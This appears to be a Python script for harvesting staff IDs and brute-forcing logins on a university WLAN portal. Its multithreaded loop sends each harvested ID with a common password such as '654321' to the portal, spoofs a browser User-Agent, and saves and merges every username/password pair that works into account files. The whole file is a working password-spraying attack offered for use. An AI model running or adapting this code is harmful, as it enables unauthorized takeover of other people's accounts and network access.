# -*- coding: utf-8 -*-
'''
Zjut.py
Zjut wlan account info collector and help to login
'''
import urllib.request
import urllib.parse
import re
import os
import time
import threading

__author__ = 'Libao Jin'
__date__ = 'Sept 02, 2015'

available_accounts = []

def get_headers():
	'fill out the header to help crawler work as a browser.'
	accept = 'text/html, application/xhtml+xml, image/jxr, */*'
	accept_language = 'en-US'
	cache_control = 'no-cache'
	connection = 'Keep-Alive'
	#content_length = '64'
	#content_type = 'application/x-www-form-urlencoded'
	host = '192.168.8.1'
	referer = 'http://192.168.8.1/a42.htm?vlanid=0&ip=10.18.202.78&mac=000000000000&wlanuserip=null&wlanacip=null&wlanacname=null&redirect=null'
	user_agent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10240'
	headers = {}
	headers['Accept'] = accept
	headers['Accept-Language'] = accept_language
	headers['Cache-Control'] = cache_control
	headers['Connection'] = connection
	#headers['Content-Length'] = content_length
	#headers['Content-Type'] = content_type
	headers['Host'] = host
	headers['Referer'] = referer
	headers['User-Agent'] = user_agent
	return headers

def get_data(account_info):
	'prefill data and return urlencoded data'
	DDDDD, upass = account_info
	values = {}
	values['0MKKey'] = '123456'
	values['DDDDD'] = DDDDD
	values['para'] = '00'
	values['R1'] = '0'
	values['R2'] = ''
	values['R6'] = '1'
	values['upass'] = upass
	data = urllib.parse.urlencode(values)
	data = data.encode('utf-8')
	return data

def save_page(the_page, filename='the_page.html'):
	'save the page as a local file for latter use'
	f = open(filename, 'w+')
	f.write(the_page)
	f.close()

def post(account_info):
	'post Zjut account info to mock login'
	url = 'http://192.168.8.1/a42.htm?vlanid=0&ip=10.18.202.78&mac=000000000000&wlanuserip=null&wlanacip=null&wlanacname=null&redirect=null'
	headers = get_headers()
	data = get_data(account_info)
	req = urllib.request.Request(url, data, headers)
	with urllib.request.urlopen(req) as response:
		the_page = response.read().decode('gbk')
		if is_successful(the_page):
			print('Username: {0}, Password: {1} login successfully!'.format(account_info[0], account_info[1]))
			available_accounts.append(account_info)
		else:
			print('Username: {0}, Password: {1} failed.'.format(account_info[0], account_info[1]))

def is_successful(the_page):
	'to justify whether login successfully'
	pattern = u'(You have successfully logged into our system)'
	p = re.compile(pattern)
	s = p.search(the_page)
	if s:
		return True
	else:
		return False

def extract_id(page):
	'extract id from teacher information'
	pattern = '<U>(.*?) *</U>'
	p = re.compile(pattern)
	m = p.findall(page)
	return m

def get_id(filename='teacher_ids.txt'):
	'get id from teacher information'
	if os.path.exists(filename):
		#print('File alread exists')
		ids = open(filename, 'r', encoding = 'utf-8').read()[:-1].split('\n')
	else:
		ids = []
		folder = './tdc/'
		os.chdir(folder)
		files = os.listdir()
		for fi in files:
			with open(fi, 'r') as f:
				page = f.read()
				ids += extract_id(page)
		os.chdir('..')
		save_file(set(ids), filename)
	return sorted(ids)

def make_account_info(uid, password):
	'generate pair account info including username and password'	
	account_info = (str(uid), password)
	return account_info

def save_file(list_items, filename):
	'save data as a local file'
	with open(filename, 'w+', encoding = 'utf-8') as f:
		for i in sorted(list_items):
			#print(i)
			f.write(str(i))
			f.write('\n')

def user_info_collector(password, ids=get_id()):
	'using brutal force to figure available accounts'
	for uid in sorted(ids):
		account_info = make_account_info(uid, password)
		post(account_info)
	filename = './accounts/Zjut_accounts_{0}.txt'.format(password)
	if available_accounts:
		save_file(available_accounts, filename)
		for aa in available_accounts:
			print(aa)

def ids_groups(ids=get_id(), number_per_group=500):
	groups = []
	number_of_groups = len(ids) // number_per_group + 1
	for i in range(number_of_groups-1):
		new_group = ids[number_per_group * i : number_per_group * (i + 1)]
		groups.append(new_group)
	groups.append(ids[(number_of_groups-1) * number_per_group:])
	return groups

def multi_user_info_collector(password='654321', sep_id=True, number_per_group=500):
	thread_id = 0
	ids = get_id()
	if sep_id:
		ids_group = ids_groups(ids, number_per_group)	
		for idg in ids_group:
			t = threading.Thread(target = user_info_collector, args = (password, idg))
			t.start()
			thread_id += 1
			print('Thread {0:d} started.'.format(thread_id))
			time.sleep(2)
	else:
		user_info_collector(password)
		#t = threading.Thread(target = user_info_collector, args = (password,))
		#t.start()
		#thread_id += 1
		#print('Thread {0:d} started.'.format(thread_id))
		#time.sleep(2)

def combine_accounts(folder='accounts', filename='Zjut_accounts_all.txt'):
	all_ids = ''
	os.chdir(folder)
	files = os.listdir('.')
	if files:
		print('Files to be combined: {0}'.format(files))
		for fi in files:
			with open(fi, 'r', encoding = 'utf-8') as f:
				all_ids += f.read()
	os.chdir('..')
	if all_ids:
		print('{0} has been updated.'.format(filename))
		save_page(all_ids, filename)

def login_now(account_info):
	'login with desired account'
	post(account_info)

if __name__ == '__main__':
	s_time = time.time()

	# passwords = ['112233', '332211', '321456', '777777']
	passwords = []

	#get_id()
	#user_info_collector()
	if passwords:
		for password in passwords:
			multi_user_info_collector(password, False, 1200)

	combine_accounts()
	login_now()

	e_time = time.time()
	elapsed_time = e_time - s_time
	print('Time elapsed: {0:.2f} seconds.'.format(elapsed_time))
